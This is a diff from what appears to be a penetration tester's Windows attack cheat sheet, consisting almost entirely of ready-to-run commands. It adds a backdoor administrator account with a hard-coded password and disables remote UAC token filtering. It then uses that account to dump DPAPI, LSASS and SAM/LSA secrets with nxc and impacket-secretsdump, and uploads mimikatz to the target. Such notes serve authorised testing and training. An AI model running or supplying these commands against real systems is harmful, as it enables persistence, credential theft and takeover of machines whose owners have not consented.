@@ -1215,7 +1215,7 @@ impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
 
 ## Dump: DPAPI, LSASS, SAM + Secrets
-(t=$TARGET; u=$USERNAME; p=$PASSWORD; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u $u -p $p --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u $u -p $p -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump $u:$p@$t) | tee dump_$t
+(t=$TARGET; u=dbf; p='123qweasdF!'; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u $u -p $p --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u $u -p $p -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump $u:$p@$t) | tee dump_$t
 
 ## Upload Binaries
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
